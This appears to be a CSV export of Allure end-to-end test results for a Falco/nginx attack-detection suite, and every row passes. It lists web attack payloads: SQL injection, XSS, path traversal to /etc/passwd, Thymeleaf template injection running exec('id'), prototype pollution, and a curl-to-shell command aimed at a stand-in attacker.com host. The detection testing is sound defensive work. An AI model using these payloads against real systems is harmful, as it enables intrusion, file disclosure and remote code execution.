"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_007` |
| **Name** | SUBSTRING-based boolean injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND SUBSTRING(username,1,1)='a`
- **Encoded**: `'%20AND%20SUBSTRING(username%2C1%2C1)%3D'a`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~75000ms
- **Timestamp**: 20:30:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_007-1770841801426-2091vo pattern_id=SQLI_BOOL_007 uri=/?q='%20AND%20SUBSTRING(username%2C1%2C1)%3D'a client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_007-1770841801426-2091vo pattern_id=SQLI_BOOL_007 uri=/?q='%20AND%20SUBSTRING(username%2C1%2C1)%3D'a client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:01.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_007-1770841801426-2091vo pattern_id=SQLI_BOOL_007 uri=/?q='%20AND%20SUBSTRING(username%2C1%2C1)%3D'a client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[038_SQLI_BOOL_007]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_STORED_001` |
| **Name** | Basic stored XSS script |
| **Category** | XSS |
| **Subcategory** | stored_xss |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<script>alert('Stored XSS')</script>`
- **Encoded**: `%3Cscript%3Ealert('Stored%20XSS')%3C%2Fscript%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~70000ms
- **Timestamp**: 20:30:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_STORED_001-1770841806422-3vrsm5 pattern_id=XSS_STORED_001 uri=/?q=%3Cscript%3Ealert('Stored%20XSS')%3C%2Fscript%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_STORED_001-1770841806422-3vrsm5 pattern_id=XSS_STORED_001 uri=/?q=%3Cscript%3Ealert('Stored%20XSS')%3C%2Fscript%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:06.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_STORED_001-1770841806422-3vrsm5 pattern_id=XSS_STORED_001 uri=/?q=%3Cscript%3Ealert('Stored%20XSS')%3C%2Fscript%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[203_XSS_STORED_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_002` |
| **Name** | UTF-8 slash encoding |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `..%c0%af..%c0%af..%c0%afetc/passwd`
- **Encoded**: `..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 20:30:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_002-1770841831472-bukak pattern_id=PATH_UNI_002 uri=/?q=..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_002-1770841831472-bukak pattern_id=PATH_UNI_002 uri=/?q=..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
20:30:31.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_002-1770841831472-bukak pattern_id=PATH_UNI_002 uri=/?q=..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[261_PATH_UNI_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_BASIC_003` |
| **Name** | Triple parent directory traversal |
| **Category** | PATH |
| **Subcategory** | basic_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../`
- **Encoded**: `../../../`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~76000ms
- **Timestamp**: 20:30:00.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_003-1770841800393-tfk5mz pattern_id=PATH_BASIC_003 uri=/?q=../../../ client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_003-1770841800393-tfk5mz pattern_id=PATH_BASIC_003 uri=/?q=../../../ client=127.0.0.1

**Falco Log Entry**:
```
20:30:00.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_003-1770841800393-tfk5mz pattern_id=PATH_BASIC_003 uri=/?q=../../../ client=127.0.0.1
```","1","test_e2e_with_logs[231_PATH_BASIC_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_057` |
| **Name** | Semicolon Variant |
| **Category** | PATH |
| **Subcategory** | filter_bypass |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `..;/etc/passwd`
- **Encoded**: `..%3B%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 20:30:27.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_057-1770841827462-50uei pattern_id=PATH_ADV_057 uri=/?q=..%3B%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_057-1770841827462-50uei pattern_id=PATH_ADV_057 uri=/?q=..%3B%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
20:30:27.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_057-1770841827462-50uei pattern_id=PATH_ADV_057 uri=/?q=..%3B%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[227_PATH_ADV_057]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BACK_004` |
| **Name** | Remote script execution via backticks |
| **Category** | CMDI |
| **Subcategory** | backtick |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: ``curl -s http://attacker.com | sh``
- **Encoded**: `%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 20:30:38.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1770841838997-f5xbmf pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1770841838997-f5xbmf pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:38.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1770841838997-f5xbmf pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[294_CMD_BACK_004]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_055` |
| **Name** | Double URL Encoding |
| **Category** | PATH |
| **Subcategory** | filter_bypass |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%252e%252e%252f`
- **Encoded**: `%252e%252e%252f`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~50000ms
- **Timestamp**: 20:30:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Encoded path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ADV_055-1770841826455-ukupt pattern_id=PATH_ADV_055 uri=/?q=%252e%252e%252f client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ADV_055-1770841826455-ukupt pattern_id=PATH_ADV_055 uri=/?q=%252e%252e%252f client=127.0.0.1

**Falco Log Entry**:
```
20:30:26.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ADV_055-1770841826455-ukupt pattern_id=PATH_ADV_055 uri=/?q=%252e%252e%252f client=127.0.0.1
```","1","test_e2e_with_logs[225_PATH_ADV_055]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_089` |
| **Name** | EXEC xp_cmdshell Injection |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `EXEC xp_cmdshell('whoami')`
- **Encoded**: `EXEC%20xp_cmdshell%28%27whoami%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 20:30:33.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_089-1770841833517-etkda5 pattern_id=SQLI_ADV_089 uri=/?q=EXEC%20xp_cmdshell%28%27whoami%27%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_089-1770841833517-etkda5 pattern_id=SQLI_ADV_089 uri=/?q=EXEC%20xp_cmdshell%28%27whoami%27%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:33.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_089-1770841833517-etkda5 pattern_id=SQLI_ADV_089 uri=/?q=EXEC%20xp_cmdshell%28%27whoami%27%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[015_SQLI_ADV_089]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_010` |
| **Name** | setTimeout string DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `setTimeout('alert(""DOM"")',1000)`
- **Encoded**: `setTimeout%28%27alert%28%22DOM%22%29%27%2C1000%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~65000ms
- **Timestamp**: 20:30:11.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_010-1770841811936-t7zxf7 pattern_id=XSS_DOM_010 uri=/?q=setTimeout%28%27alert%28%22DOM%22%29%27%2C1000%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_010-1770841811936-t7zxf7 pattern_id=XSS_DOM_010 uri=/?q=setTimeout%28%27alert%28%22DOM%22%29%27%2C1000%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:11.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_010-1770841811936-t7zxf7 pattern_id=XSS_DOM_010 uri=/?q=setTimeout%28%27alert%28%22DOM%22%29%27%2C1000%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[154_XSS_DOM_010]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PICKLE_DESER_003` |
| **Name** | cPickle.loads Remote Code Execution |
| **Category** | PICKLE |
| **Subcategory** | deserialization |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `cPickle.loads(data)`
- **Encoded**: `cPickle.loads%28data%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~26000ms
- **Timestamp**: 20:30:50.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Deserialization attack` |
| **Matched Rule** | `[NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_003-1770841850394-m3vjd pattern_id=PICKLE_DESER_003 uri=/?q=cPickle.loads%28data%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_003-1770841850394-m3vjd pattern_id=PICKLE_DESER_003 uri=/?q=cPickle.loads%28data%29 client=127.0.0.1

**Falco Log Entry**:
```
20:30:50.000000000: Critical [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_003-1770841850394-m3vjd pattern_id=PICKLE_DESER_003 uri=/?q=cPickle.loads%28data%29 client=127.0.0.1
```","1","test_e2e_with_logs[427_PICKLE_DESER_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_PROTO_002` |
| **Name** | Prototype Pollution via Constructor |
| **Category** | API_SECURITY |
| **Subcategory** | prototype_pollution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{""constructor"":{""prototype"":{""isAdmin"":true}}}`
- **Encoded**: `%7B%22constructor%22%3A%7B%22prototype%22%3A%7B%22isAdmin%22%3Atrue%7D%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~26000ms
- **Timestamp**: 20:30:50.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_PROTO_002-1770841850909-5p75yz pattern_id=API_PROTO_002 uri=/?q=%7B%22constructor%22%3A%7B%22prototype%22%3A%7B%22isAdmin%22%3Atrue%7D%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_PROTO_002-1770841850909-5p75yz pattern_id=API_PROTO_002 uri=/?q=%7B%22constructor%22%3A%7B%22prototype%22%3A%7B%22isAdmin%22%3Atrue%7D%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
20:30:50.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_PROTO_002-1770841850909-5p75yz pattern_id=API_PROTO_002 uri=/?q=%7B%22constructor%22%3A%7B%22prototype%22%3A%7B%22isAdmin%22%3Atrue%7D%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[518_API_PROTO_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_THYME_001` |
| **Name** | Thymeleaf expression injection |
| **Category** | SSTI |
| **Subcategory** | thymeleaf |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `__${T(java.lang.Runtime).getRuntime().exec(""id"")}__`
- **Encoded**: `__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 20:30:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Spring4Shell attack` |
| **Matched Rule** | `[NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_THYME_001-1770841837402-6n2ms pattern_id=SSTI_THYME_001 uri=/?q=__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__ client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_THYME_001-1770841837402-6n2ms pattern_id=SSTI_THYME_001 uri=/?q=__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__ client=127.0.0.1

**Falco Log Entry**:
```
20:30:37.000000000: Critical [NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_THYME_001-1770841837402-6n2ms pattern_id=SSTI_THYME_001 uri=/?q=__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__ client=127.0.0.1
```","2","test_e2e_with_logs[539_SSTI_THYME_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_BYPASS_009` |
| **Name** | iframe srcdoc injection |
| **Category** | XSS |
| **Subcategory** | bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<iframe srcdoc='<script>alert(1)</script>'>`
- **Encoded**: `%3Ciframe%20srcdoc%3D'%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~61000ms
- **Timestamp**: 20:30:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_009-1770841815946-n48qcj pattern_id=XSS_BYPASS_009 uri=/?q=%3Ciframe%20srcdoc%3D'%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_009-1770841815946-n48qcj pattern_id=XSS_BYPASS_009 uri=/?q=%3Ciframe%20srcdoc%3D'%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:15.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_009-1770841815946-n48qcj pattern_id=XSS_BYPASS_009 uri=/?q=%3Ciframe%20srcdoc%3D'%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[143_XSS_BYPASS_009]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_UNION_007` |
| **Name** | File write via INTO OUTFILE |
| **Category** | SQLI |
| **Subcategory** | union_based |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt' --`
- **Encoded**: `%27%20UNION%20SELECT%201%2C2%2C3%20INTO%20OUTFILE%20%27%2Ftmp%2Ftest.txt%27%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~63000ms
- **Timestamp**: 20:30:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_007-1770841813459-k999nj pattern_id=SQLI_UNION_007 uri=/?q=%27%20UNION%20SELECT%201%2C2%2C3%20INTO%20OUTFILE%20%27%2Ftmp%2Ftest.txt%27%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_007-1770841813459-k999nj pattern_id=SQLI_UNION_007 uri=/?q=%27%20UNION%20SELECT%201%2C2%2C3%20INTO%20OUTFILE%20%27%2Ftmp%2Ftest.txt%27%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
20:30:13.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_007-1770841813459-k999nj pattern_id=SQLI_UNION_007 uri=/?q=%27%20UNION%20SELECT%201%2C2%2C3%20INTO%20OUTFILE%20%27%2Ftmp%2Ftest.txt%27%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[122_SQLI_UNION_007]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
